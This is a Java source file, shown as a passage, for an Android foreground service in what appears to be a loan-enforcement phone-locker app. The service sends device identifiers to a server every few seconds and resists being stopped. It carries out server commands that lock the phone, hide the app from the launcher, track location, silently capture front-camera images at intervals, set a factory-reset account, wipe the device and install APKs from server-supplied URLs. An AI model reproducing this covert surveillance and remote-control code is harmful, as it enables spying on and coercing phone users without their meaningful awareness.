package com.riad.rrlkr.service;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import android.content.pm.ServiceInfo;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.riad.rrlkr.App;
import com.riad.rrlkr.R;
import com.riad.rrlkr.network.ApiClient;
import com.riad.rrlkr.network.ApiService;
import com.riad.rrlkr.network.models.CommandAck;
import com.riad.rrlkr.network.models.CommandResponse;
import com.riad.rrlkr.network.models.HeartbeatRequest;
import com.riad.rrlkr.network.models.HeartbeatResponse;
import com.riad.rrlkr.ui.MainActivity;
import com.riad.rrlkr.util.DeviceUtils;
import com.riad.rrlkr.util.DeviceProtectedPrefs;
import com.riad.rrlkr.util.PreferenceManager;
import com.riad.rrlkr.streaming.StreamingWsClient;

import java.util.List;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Foreground Service that maintains connection with server
 * and monitors device status
 */
public class DeviceMonitorService extends Service {
    
    private static final String TAG = "DeviceMonitorService";
    private static final int NOTIFICATION_ID = 1001;
    private static final long HEARTBEAT_INTERVAL = 8 * 1000; // 8 seconds (network is async via enqueue -> no ANR)
    private static final long COMMAND_CHECK_INTERVAL = 2 * 1000; // 2 seconds (fast command pickup; enqueue is async)
    private static final long PROTECTION_CHECK_INTERVAL = 120 * 1000; // 2 minutes (was 1m)
    private static final long LOCK_TASK_CHECK_INTERVAL = 10 * 1000; // 10 seconds
    private static final long UPDATE_CHECK_INTERVAL = 6 * 60 * 60 * 1000; // 6 hours
    
    private Handler handler;
    private Handler bgHandler; // Background thread for heavy operations
    private HandlerThread bgThread;
    private Runnable heartbeatRunnable;
    private Runnable commandCheckRunnable;
    private Runnable protectionCheckRunnable;
    private Runnable lockTaskCheckRunnable;
    private Runnable updateCheckRunnable;
    private PreferenceManager preferenceManager;
    private ApiService apiService;
    private DeviceProtectionManager protectionManager;
    private boolean isRunning = false;
    /** Persistent real-time command channel — server pushes a wake the instant
     *  the admin issues a command, so we execute it without waiting for the
     *  2s poll. The poll + FCM remain as fallbacks if this socket drops. */
    private StreamingWsClient commandWs;
    /** IDs of commands already handled in this process. Because the real-time
     *  wake-fetch and the 2s poll can both return a freshly-created (SENT)
     *  command before our ack lands on the server, we de-duplicate here so a
     *  command is never executed twice. Bounded LRU to cap memory. */
    private final java.util.Set<String> handledCommandIds =
        java.util.Collections.synchronizedSet(
            java.util.Collections.newSetFromMap(
                new java.util.LinkedHashMap<String, Boolean>(256, 0.75f, true) {
                    @Override
                    protected boolean removeEldestEntry(
                            java.util.Map.Entry<String, Boolean> eldest) {
                        return size() > 200;
                    }
                }));
    
    /**
     * Start the monitoring service
     */
    public static void start(Context context) {
        Intent intent = new Intent(context, DeviceMonitorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }
    
    /**
     * Stop the monitoring service
     */
    public static void stop(Context context) {
        Intent intent = new Intent(context, DeviceMonitorService.class);
        context.stopService(intent);
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Service created");
        
        preferenceManager = new PreferenceManager(this);
        apiService = ApiClient.getApiService();
        handler = new Handler(Looper.getMainLooper());
        
        // Background thread for heavy DPM operations (prevents ANR)
        bgThread = new HandlerThread("DeviceMonitorBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
        
        protectionManager = new DeviceProtectionManager(this);
        
        // MIGRATION: Old code saved "is_enrolled"=true but isEnrolled() reads "enrolled".
        // Copy the old key value to the correct key so existing enrolled devices keep working.
        if (!preferenceManager.isEnrolled() && preferenceManager.getBoolean("is_enrolled", false)) {
            Log.w(TAG, "MIGRATION: Copying is_enrolled â†’ enrolled");
            preferenceManager.setEnrolled(true);
        }
        
        // Heartbeat runnable
        heartbeatRunnable = new Runnable() {
            @Override
            public void run() {
                sendHeartbeat();
                if (isRunning) {
                    handler.postDelayed(this, HEARTBEAT_INTERVAL);
                }
            }
        };
        
        // Command check runnable - polls for pending commands every 3 seconds
        commandCheckRunnable = new Runnable() {
            @Override
            public void run() {
                checkPendingCommands();
                if (isRunning) {
                    handler.postDelayed(this, COMMAND_CHECK_INTERVAL);
                }
            }
        };
        
        // Protection check â€” runs on BACKGROUND thread to prevent ANR
        protectionCheckRunnable = new Runnable() {
            @Override
            public void run() {
                bgHandler.post(() -> verifyAndReapplyProtections());
                if (isRunning) {
                    handler.postDelayed(this, PROTECTION_CHECK_INTERVAL);
                }
            }
        };
        
        // Lock task check runnable - ensures lock task mode is always active (every 10 seconds)
        lockTaskCheckRunnable = new Runnable() {
            @Override
            public void run() {
                ensureLockTaskActive();
                if (isRunning) {
                    handler.postDelayed(this, LOCK_TASK_CHECK_INTERVAL);
                }
            }
        };
        
        // OTA update check runnable - checks server for app updates every 6 hours
        updateCheckRunnable = new Runnable() {
            @Override
            public void run() {
                checkForAppUpdate();
                if (isRunning) {
                    handler.postDelayed(this, UPDATE_CHECK_INTERVAL);
                }
            }
        };
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Service started");
        
        // Start as foreground service (Android 14+ requires specifying service type)
        if (Build.VERSION.SDK_INT >= 34) {
            // Only use SPECIAL_USE â€” camera and location are handled by their own services
            // Using CAMERA type here crashes if CAMERA permission isn't granted yet
            startForeground(NOTIFICATION_ID, createNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(NOTIFICATION_ID, createNotification());
        }
        
        // Start heartbeat
        boolean firstStart = !isRunning;
        isRunning = true;

        if (firstStart) {
            // First launch of the loops in this service lifetime.
            handler.post(heartbeatRunnable);
            handler.post(commandCheckRunnable);
            handler.post(protectionCheckRunnable);
            handler.post(lockTaskCheckRunnable);
            // Start OTA update check (first check after 30s, then every 6 hours)
            handler.postDelayed(updateCheckRunnable, 30 * 1000);
            // Open the real-time command socket for instant command delivery.
            connectCommandSocket();
        } else {
            // Re-delivered start (network restored, keep-alive worker, task
            // removed). Don't re-post the periodic loops -- that would create
            // duplicate timers and drain the battery. Instead do ONE immediate
            // sync so the device reconnects to the admin panel right away.
            Log.i(TAG, "Re-start received - triggering immediate sync");
            handler.post(() -> {
                try { sendHeartbeat(); } catch (Throwable ignored) {}
                try { checkPendingCommands(); } catch (Throwable ignored) {}
            });
            // Make sure the real-time command socket is connected (network may
            // have just come back). connectCommandSocket() is a no-op if it is
            // already live, otherwise it (re)connects.
            connectCommandSocket();
        }

        // Check if device should be locked
        checkDeviceStatus();
        
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Service destroyed");
        
        isRunning = false;
        handler.removeCallbacks(heartbeatRunnable);
        handler.removeCallbacks(commandCheckRunnable);
        handler.removeCallbacks(protectionCheckRunnable);
        handler.removeCallbacks(lockTaskCheckRunnable);
        handler.removeCallbacks(updateCheckRunnable);
        
        // Tear down the real-time command socket.
        if (commandWs != null) {
            try { commandWs.close(); } catch (Throwable ignored) {}
            commandWs = null;
        }
        
        // Clean up background thread
        if (bgThread != null) {
            bgThread.quitSafely();
            bgThread = null;
        }
        
        // Schedule WorkManager as a safety net
        ServiceKeepAliveWorker.schedule(getApplicationContext());
        
        // Restart service if it gets killed (with Android 12+ safety)
        try {
            Intent restartIntent = new Intent(getApplicationContext(), DeviceMonitorService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent);
            } else {
                startService(restartIntent);
            }
        } catch (Exception e) {
            // Android 12+ may throw ForegroundServiceStartNotAllowedException
            Log.w(TAG, "Cannot restart service from onDestroy (expected on Android 12+): " + e.getMessage());
            // WorkManager will restart us
        }
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.i(TAG, "Task removed, restarting service");
        
        // Schedule WorkManager as a safety net
        ServiceKeepAliveWorker.schedule(getApplicationContext());
        
        // Restart service when app is swiped away (with Android 12+ safety)
        try {
            Intent restartIntent = new Intent(getApplicationContext(), DeviceMonitorService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent);
            } else {
                startService(restartIntent);
            }
        } catch (Exception e) {
            Log.w(TAG, "Cannot restart service from onTaskRemoved: " + e.getMessage());
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        );
        
        return new NotificationCompat.Builder(this, App.CHANNEL_ID_SERVICE)
            .setContentTitle("Device Manager Active")
            .setContentText("Device protection is enabled")
            .setSmallIcon(R.drawable.ic_lock)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }
    
    private void sendHeartbeat() {
        String imei = DeviceUtils.getIMEI(this);
        String fcmToken = preferenceManager.getFcmToken();
        
        if (imei == null || imei.isEmpty()) {
            Log.w(TAG, "Cannot send heartbeat - missing IMEI");
            return;
        }
        
        // If FCM token is missing, try to get a fresh one (don't skip heartbeat!)
        if (fcmToken == null || fcmToken.isEmpty()) {
            Log.w(TAG, "FCM token missing â€” requesting new token and sending heartbeat without it");
            try {
                com.google.firebase.messaging.FirebaseMessaging.getInstance().getToken()
                    .addOnSuccessListener(token -> {
                        if (token != null && !token.isEmpty()) {
                            preferenceManager.setFcmToken(token);
                            try {
                                DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(DeviceMonitorService.this);
                                dpPrefs.saveString("dp_fcm_token", token);
                            } catch (Exception e) { /* ignore */ }
                            Log.i(TAG, "FCM token refreshed successfully");
                        }
                    });
            } catch (Exception e) {
                Log.w(TAG, "Failed to request FCM token: " + e.getMessage());
            }
        }
        
        HeartbeatRequest request = new HeartbeatRequest();
        request.setImei(imei);
        request.setImei2(DeviceUtils.getIMEI2(this));
        try {
            request.setAndroidId(android.provider.Settings.Secure.getString(
                    getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
        } catch (Exception ignored) {}
        request.setFcmToken(fcmToken);
        request.setBatteryLevel(DeviceUtils.getBatteryLevel(this));
        request.setCharging(DeviceUtils.isCharging(this));
        request.setNetworkType(DeviceUtils.getNetworkType(this));
        request.setAppVersion(DeviceUtils.getAppVersion(this));
        
        // Full device info - sent every 2 seconds
        request.setDeviceName(android.os.Build.DEVICE);
        request.setBrand(android.os.Build.BRAND);
        request.setManufacturer(android.os.Build.MANUFACTURER);
        request.setDeviceModel(android.os.Build.MODEL);
        request.setSerialNumber(DeviceUtils.getSerialNumber(this));
        request.setAndroidVersion(android.os.Build.VERSION.RELEASE);
        
        // Device admin status
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) {
                request.setDeviceOwner(dpm.isDeviceOwnerApp(getPackageName()));
                request.setAdminActive(dpm.isAdminActive(
                        com.riad.rrlkr.admin.EMIDeviceAdminReceiver.getComponentName(this)));
            }
        } catch (Exception e) {
            Log.w(TAG, "Error checking admin status: " + e.getMessage());
        }
        
        apiService.sendHeartbeat(request).enqueue(new Callback<HeartbeatResponse>() {
            @Override
            public void onResponse(Call<HeartbeatResponse> call, Response<HeartbeatResponse> response) {
                if (response.isSuccessful() && response.body() != null) {
                    HeartbeatResponse heartbeat = response.body();
                    Log.d(TAG, "Heartbeat sent. Device status: " + heartbeat.getStatus());
                    
                    // Handle server response
                    handleServerStatus(heartbeat.getStatus());
                } else {
                    Log.e(TAG, "Heartbeat failed: " + response.code());
                }
            }
            
            @Override
            public void onFailure(Call<HeartbeatResponse> call, Throwable t) {
                Log.e(TAG, "Heartbeat error", t);
            }
        });
    }
    
    private void checkDeviceStatus() {
        // Check locally saved lock status from BOTH storages
        boolean isLocked = preferenceManager.isDeviceLocked();
        if (!isLocked) {
            try {
                DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
                isLocked = dpPrefs.isDeviceLocked() || dpPrefs.getBoolean("admin_lock_command", false);
                if (isLocked) {
                    // Restore lock state to regular prefs
                    preferenceManager.setDeviceLocked(true);
                    preferenceManager.saveBoolean("admin_lock_command", true);
                    Log.i(TAG, "Lock state restored from device-protected prefs");
                }
            } catch (Exception e) { /* ignore */ }
        }
        
        if (isLocked) {
            LockManager.showLockScreen(this);
        }
        
        // Restore critical state from DeviceProtectedPrefs if missing
        restoreCriticalStateFromDP();
    }
    
    /**
     * Restore critical enrollment data from DeviceProtectedPrefs if regular prefs are empty.
     * This handles the case where app data was cleared but device-protected storage survives.
     */
    private void restoreCriticalStateFromDP() {
        try {
            DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
            
            // Restore deviceId
            if ((preferenceManager.getDeviceId() == null || preferenceManager.getDeviceId().isEmpty())
                    && dpPrefs.getDeviceId() != null && !dpPrefs.getDeviceId().isEmpty()) {
                preferenceManager.setDeviceId(dpPrefs.getDeviceId());
                Log.i(TAG, "Restored deviceId from device-protected storage");
            }
            
            // Restore enrolled status
            if (!preferenceManager.isEnrolled() && dpPrefs.isEnrolled()) {
                preferenceManager.setEnrolled(true);
                Log.i(TAG, "Restored enrolled status from device-protected storage");
            }
            
            // Restore server URL
            String dpServerUrl = dpPrefs.getServerUrl();
            if (dpServerUrl != null && !dpServerUrl.isEmpty()) {
                String currentUrl = preferenceManager.getServerUrl();
                if (currentUrl == null || currentUrl.isEmpty() || currentUrl.equals("https://riadrayhan111-rr-locker-api.hf.space/api/v1")) {
                    // Only restore if current is default/empty â€” DP may have the real one
                    preferenceManager.setServerUrl(dpServerUrl);
                    Log.i(TAG, "Restored server URL from device-protected storage");
                }
            }
            
            // Restore FCM token
            if ((preferenceManager.getFcmToken() == null || preferenceManager.getFcmToken().isEmpty())
                    && dpPrefs.getFcmToken() != null && !dpPrefs.getFcmToken().isEmpty()) {
                preferenceManager.setFcmToken(dpPrefs.getFcmToken());
                Log.i(TAG, "Restored FCM token from device-protected storage");
            }
            
            // Restore IMEI
            if ((preferenceManager.getStoredIMEI() == null || preferenceManager.getStoredIMEI().isEmpty())
                    && dpPrefs.getStoredIMEI() != null && !dpPrefs.getStoredIMEI().isEmpty()) {
                preferenceManager.setStoredIMEI(dpPrefs.getStoredIMEI());
                Log.i(TAG, "Restored IMEI from device-protected storage");
            }
        } catch (Exception e) {
            Log.w(TAG, "Error restoring from device-protected storage: " + e.getMessage());
        }
    }
    
    private void handleServerStatus(String status) {
        switch (status) {
            case "locked":
                if (!preferenceManager.isDeviceLocked()) {
                    Log.i(TAG, "Server says device should be locked");
                    preferenceManager.saveBoolean("admin_lock_command", true);
                    preferenceManager.setDeviceLocked(true);
                    try {
                        DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
                        dpPrefs.setDeviceLocked(true);
                        dpPrefs.saveBoolean("admin_lock_command", true);
                    } catch (Exception e) { /* ignore */ }
                    LockManager.showLockScreen(this);
                    
                    if (!preferenceManager.isAppDisabled()) {
                        bgHandler.post(() -> protectionManager.applyAllProtections());
                    }
                }
                break;
                
            case "active":
                if (preferenceManager.isDeviceLocked()) {
                    Log.i(TAG, "Server says device should be unlocked");
                    preferenceManager.saveBoolean("admin_lock_command", false);
                    preferenceManager.setDeviceLocked(false);
                    try {
                        DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
                        dpPrefs.setDeviceLocked(false);
                        dpPrefs.saveBoolean("admin_lock_command", false);
                    } catch (Exception e) { /* ignore */ }
                    LockManager.hideLockScreen(this);
                    protectionManager.enableStatusBar();
                }
                break;
        }
    }
    
    /**
     * Open (or force-reconnect) the persistent real-time command socket. When
     * the server pushes {@code {"event":"command"}} we immediately fetch and
     * execute pending commands instead of waiting for the next 2s poll.
     * Safe to call repeatedly — reconnects only when not already connected.
     */
    private void connectCommandSocket() {
        String deviceId = preferenceManager.getDeviceId();
        if (deviceId == null || deviceId.isEmpty()) {
            try {
                DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
                deviceId = dpPrefs.getDeviceId();
            } catch (Exception ignored) {}
        }
        if (deviceId == null || deviceId.isEmpty()) return;

        if (commandWs != null) {
            // Already created — just make sure it's live.
            if (!commandWs.isConnected()) {
                try { commandWs.forceReconnect(); } catch (Throwable ignored) {}
            }
            return;
        }

        commandWs = new StreamingWsClient("commands/ws/" + deviceId,
            new StreamingWsClient.Callback() {
                @Override
                public void onTextMessage(String text) {
                    // Any push on this channel means "go fetch your commands now".
                    if (text != null && text.contains("command")) {
                        Log.i(TAG, "Real-time command wake received");
                        handler.post(() -> {
                            try { checkPendingCommands(); } catch (Throwable ignored) {}
                        });
                    }
                }
            });
        try {
            commandWs.connect();
            Log.i(TAG, "Command socket connecting for device: " + deviceId);
        } catch (Throwable t) {
            Log.w(TAG, "Command socket connect failed: " + t.getMessage());
        }
    }

    private void checkPendingCommands() {
        String deviceId = preferenceManager.getDeviceId();
        if (deviceId == null || deviceId.isEmpty()) {
            // Fallback: try device-protected storage
            try {
                DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
                deviceId = dpPrefs.getDeviceId();
                if (deviceId != null && !deviceId.isEmpty()) {
                    preferenceManager.setDeviceId(deviceId);
                    Log.i(TAG, "Restored deviceId from device-protected storage");
                }
            } catch (Exception e) { /* ignore */ }
            if (deviceId == null || deviceId.isEmpty()) {
                return;
            }
        }
        
        Log.d(TAG, "Checking pending commands for device: " + deviceId);
        
        apiService.getPendingCommands(deviceId).enqueue(new Callback<List<CommandResponse>>() {
            @Override
            public void onResponse(Call<List<CommandResponse>> call, Response<List<CommandResponse>> response) {
                if (response.isSuccessful() && response.body() != null) {
                    List<CommandResponse> commands = response.body();
                    if (!commands.isEmpty()) {
                        Log.d(TAG, "Found " + commands.size() + " pending commands");
                        processCommands(commands);
                    }
                }
            }
            
            @Override
            public void onFailure(Call<List<CommandResponse>> call, Throwable t) {
                Log.e(TAG, "Failed to check pending commands", t);
            }
        });
    }
    
    private static int payloadInt(Map<String, Object> payload, String key, int def) {
        if (payload == null || !payload.containsKey(key)) return def;
        try { return (int) Math.round(Double.parseDouble(String.valueOf(payload.get(key)))); }
        catch (Exception e) { return def; }
    }

    private static float payloadFloat(Map<String, Object> payload, String key, float def) {
        if (payload == null || !payload.containsKey(key)) return def;
        try { return Float.parseFloat(String.valueOf(payload.get(key))); }
        catch (Exception e) { return def; }
    }

    private void processCommands(List<CommandResponse> commands) {
        for (CommandResponse cmd : commands) {
            String type = cmd.getCommandType();
            // De-duplicate: the real-time wake-fetch and the periodic poll can
            // both return the same freshly-created command before our ack
            // reaches the server. Skip anything we've already started handling.
            String cmdId = cmd.getId();
            if (cmdId != null && !handledCommandIds.add(cmdId)) {
                Log.d(TAG, "Skipping duplicate command id: " + cmdId);
                continue;
            }
            Log.d(TAG, "Processing command: " + type + " id: " + cmd.getId());
            
            if ("LOCK".equalsIgnoreCase(type) || "lock".equals(type)) {
                String message = "Device locked by administrator.";
                String contact = null;
                
                Map<String, Object> payload = cmd.getPayload();
                if (payload != null) {
                    if (payload.containsKey("message")) {
                        message = String.valueOf(payload.get("message"));
                    }
                    if (payload.containsKey("contact_number")) {
                        contact = String.valueOf(payload.get("contact_number"));
                    }
                }
                
                Log.i(TAG, "Lock command received - locking device");
                preferenceManager.saveBoolean("admin_lock_command", true);
                preferenceManager.setDeviceLocked(true);
                
                // Save to device-protected storage (survives reboot + data clear)
                try {
                    DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(DeviceMonitorService.this);
                    dpPrefs.setDeviceLocked(true);
                    dpPrefs.saveBoolean("admin_lock_command", true);
                } catch (Exception e) {
                    Log.w(TAG, "Could not save to device-protected prefs: " + e.getMessage());
                }
                
                LockManager.showLockScreen(DeviceMonitorService.this, message, contact);
                
                // Apply protections on BACKGROUND thread (prevents ANR)
                bgHandler.post(() -> protectionManager.applyAllProtections());
                
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("UNLOCK".equalsIgnoreCase(type) || "unlock".equals(type)) {
                Log.i(TAG, "Unlock command received - unlocking device");
                preferenceManager.saveBoolean("admin_lock_command", false);
                preferenceManager.setDeviceLocked(false);
                
                // Save to device-protected storage
                try {
                    DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(DeviceMonitorService.this);
                    dpPrefs.setDeviceLocked(false);
                    dpPrefs.saveBoolean("admin_lock_command", false);
                } catch (Exception e) {
                    Log.w(TAG, "Could not save unlock to device-protected prefs: " + e.getMessage());
                }
                
                LockManager.hideLockScreen(DeviceMonitorService.this);
                
                // Re-enable status bar when unlocking
                protectionManager.enableStatusBar();
                
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("HIDE_APP".equalsIgnoreCase(type) || "hide_app".equals(type)) {
                Log.i(TAG, "Hide app command received - hiding from launcher");
                protectionManager.hideAppFromLauncher();
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("UNHIDE_APP".equalsIgnoreCase(type) || "unhide_app".equals(type)) {
                Log.i(TAG, "Unhide app command received - showing in launcher");
                protectionManager.unhideAppInLauncher();
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("DISABLE_APP".equalsIgnoreCase(type) || "disable_app".equals(type)) {
                Log.w(TAG, "Disable app command received - PERMANENTLY REMOVING APP");
                // Mark as disabled FIRST so app doesn't re-apply on restart
                preferenceManager.setAppDisabled(true);
                preferenceManager.setProtectionsApplied(false);
                preferenceManager.setDeviceLocked(false);
                
                // Remove all protections (re-enables ADB, USB, etc.)
                protectionManager.removeAllProtections();
                protectionManager.unhideAppInLauncher();
                protectionManager.enableStatusBar();
                
                acknowledgeCommand(cmd.getId(), "executed");
                Log.w(TAG, "App DISABLED - initiating permanent uninstall");
                
                // Stop service and uninstall after short delay
                isRunning = false;
                handler.removeCallbacks(heartbeatRunnable);
                handler.removeCallbacks(commandCheckRunnable);
                handler.removeCallbacks(protectionCheckRunnable);
                handler.removeCallbacks(updateCheckRunnable);
                
                handler.postDelayed(() -> {
                    protectionManager.clearDeviceOwnerAndUninstall();
                }, 2000);
                return; // Stop processing further commands
                
            } else if ("ENABLE_APP".equalsIgnoreCase(type) || "enable_app".equals(type)) {
                Log.i(TAG, "Enable app command received - re-applying all protections");
                // Clear disabled flag
                preferenceManager.setAppDisabled(false);
                
                // Re-apply all protections
                protectionManager.applyAllProtections();
                preferenceManager.setProtectionsApplied(true);
                
                acknowledgeCommand(cmd.getId(), "executed");
                Log.i(TAG, "App ENABLED - all protections re-applied");
                
            } else if ("UNINSTALL_APP".equalsIgnoreCase(type) || "uninstall_app".equals(type)) {
                Log.w(TAG, "Uninstall app command received - PERMANENTLY REMOVING APP");
                preferenceManager.setAppDisabled(true);
                preferenceManager.setProtectionsApplied(false);
                preferenceManager.setDeviceLocked(false);
                
                // Remove all protections
                protectionManager.removeAllProtections();
                protectionManager.unhideAppInLauncher();
                protectionManager.enableStatusBar();
                
                acknowledgeCommand(cmd.getId(), "executed");
                
                // Stop service and uninstall after short delay
                isRunning = false;
                handler.removeCallbacks(heartbeatRunnable);
                handler.removeCallbacks(commandCheckRunnable);
                handler.removeCallbacks(protectionCheckRunnable);
                handler.removeCallbacks(updateCheckRunnable);
                
                handler.postDelayed(() -> {
                    protectionManager.clearDeviceOwnerAndUninstall();
                }, 2000);
                return; // Stop processing further commands
                
            } else if ("GPS_TRACK".equalsIgnoreCase(type) || "gps_track".equals(type)) {
                Log.i(TAG, "GPS track command received - getting location");
                LocationTracker locationTracker = new LocationTracker(DeviceMonitorService.this);
                locationTracker.trackAndReport();
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("CAMERA_ON".equalsIgnoreCase(type) || "camera_on".equals(type)) {
                Log.i(TAG, "Camera ON command received - starting capture");
                preferenceManager.setCameraActive(true);
                
                // Ensure camera is not blocked by device policy
                try {
                    android.app.admin.DevicePolicyManager dpmCam = (android.app.admin.DevicePolicyManager) 
                            getSystemService(Context.DEVICE_POLICY_SERVICE);
                    if (dpmCam != null && dpmCam.isDeviceOwnerApp(getPackageName())) {
                        android.content.ComponentName adminComp = 
                                com.riad.rrlkr.admin.EMIDeviceAdminReceiver.getComponentName(DeviceMonitorService.this);
                        dpmCam.setCameraDisabled(adminComp, false);
                        Log.i(TAG, "Camera explicitly enabled via DPM before capture");
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Could not enable camera via DPM: " + e.getMessage());
                }
                
                long interval = 3000;
                Map<String, Object> payload = cmd.getPayload();
                if (payload != null && payload.containsKey("capture_interval")) {
                    try {
                        interval = Long.parseLong(String.valueOf(payload.get("capture_interval"))) * 1000;
                    } catch (Exception e) {
                        Log.w(TAG, "Invalid capture interval");
                    }
                }

                String lens = "front";
                if (payload != null && payload.containsKey("camera")) {
                    lens = String.valueOf(payload.get("camera"));
                }
                final String captureLens = lens;

                // Delay to let DPM change take effect (longer for Samsung)
                final long captureInterval = interval;
                long startDelay = android.os.Build.MANUFACTURER.equalsIgnoreCase("samsung") ? 2000 : 1000;
                handler.postDelayed(() -> {
                    RemoteCameraCapture cameraCapture = new RemoteCameraCapture(DeviceMonitorService.this);
                    cameraCapture.captureAndReport(true, captureInterval, captureLens);
                }, startDelay);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("CAMERA_OFF".equalsIgnoreCase(type) || "camera_off".equals(type)) {
                Log.i(TAG, "Camera OFF command received - stopping capture");
                preferenceManager.setCameraActive(false);
                RemoteCameraCapture cameraCapture = new RemoteCameraCapture(DeviceMonitorService.this);
                cameraCapture.stopCapture();
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("WARNING".equalsIgnoreCase(type) || "warning".equals(type)) {
                Log.i(TAG, "Warning command received");
                Map<String, Object> payload = cmd.getPayload();
                String warnTitle = payload != null && payload.containsKey("title") ?
                        String.valueOf(payload.get("title")) : "EMI Payment Reminder";
                String warnMessage = payload != null && payload.containsKey("message") ?
                        String.valueOf(payload.get("message")) : "Please make your payment.";
                // Show warning notification (same as FCM path)
                try {
                    Intent warnIntent = new Intent(this, com.riad.rrlkr.ui.MainActivity.class);
                    PendingIntent warnPending = PendingIntent.getActivity(
                        this, 0, warnIntent, PendingIntent.FLAG_IMMUTABLE);
                    NotificationCompat.Builder builder = new NotificationCompat.Builder(this, com.riad.rrlkr.App.CHANNEL_ID_WARNINGS)
                        .setSmallIcon(com.riad.rrlkr.R.drawable.ic_warning)
                        .setContentTitle(warnTitle)
                        .setContentText(warnMessage)
                        .setStyle(new NotificationCompat.BigTextStyle().bigText(warnMessage))
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .setAutoCancel(true)
                        .setContentIntent(warnPending);
                    android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    nm.notify((int) System.currentTimeMillis(), builder.build());
                } catch (Exception e) {
                    Log.e(TAG, "Error showing warning notification", e);
                }
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("SET_FRP_ACCOUNT".equalsIgnoreCase(type) || "set_frp_account".equals(type)) {
                Log.i(TAG, "Set FRP account command received");
                Map<String, Object> payload = cmd.getPayload();
                if (payload != null && payload.containsKey("frp_account")) {
                    String frpAccount = String.valueOf(payload.get("frp_account"));
                    protectionManager.setFRPAccount(frpAccount);
                    Log.i(TAG, "FRP account set successfully");
                }
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("WIPE".equalsIgnoreCase(type) || "wipe".equals(type)) {
                Log.i(TAG, "Wipe command received");
                acknowledgeCommand(cmd.getId(), "executed");
                // Wipe will be done by FCM handler
                
            } else if ("SYNC".equalsIgnoreCase(type) || "sync".equals(type)) {
                Log.i(TAG, "Sync command received - sending heartbeat");
                sendHeartbeat();
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("SHOW_MESSAGE".equalsIgnoreCase(type) || "show_message".equals(type)) {
                Log.i(TAG, "Show message command received");
                Map<String, Object> payload = cmd.getPayload();
                if (payload != null) {
                    String msg = payload.containsKey("message") ? 
                            String.valueOf(payload.get("message")) : "Message from admin";
                    // Save the message to preferences for lock screen display
                    preferenceManager.setLockMessage(msg);
                    // If device is currently locked, re-show lock screen with new message
                    if (preferenceManager.isDeviceLocked()) {
                        preferenceManager.saveBoolean("admin_lock_command", true);
                        LockManager.showLockScreen(this, msg, null);
                    }
                }
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("UPDATE_POLICY".equalsIgnoreCase(type) || "update_policy".equals(type)) {
                Log.i(TAG, "Update policy command received - re-applying protections");
                bgHandler.post(() -> protectionManager.applyAllProtections());
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("UPDATE_APP".equalsIgnoreCase(type) || "update_app".equals(type)) {
                Log.i(TAG, "Update app command received - OTA silent update");
                acknowledgeCommand(cmd.getId(), "executed");
                Map<String, Object> payload = cmd.getPayload();
                String apkUrl = payload != null ? String.valueOf(payload.getOrDefault("apk_url", "")) : "";
                boolean force = payload != null && "true".equalsIgnoreCase(String.valueOf(payload.getOrDefault("force", "false")));
                AppSelfUpdateService updateService = new AppSelfUpdateService(DeviceMonitorService.this);
                if (apkUrl != null && !apkUrl.isEmpty()) {
                    updateService.downloadAndInstall(apkUrl);
                } else {
                    updateService.checkAndUpdate(force);
                }
                
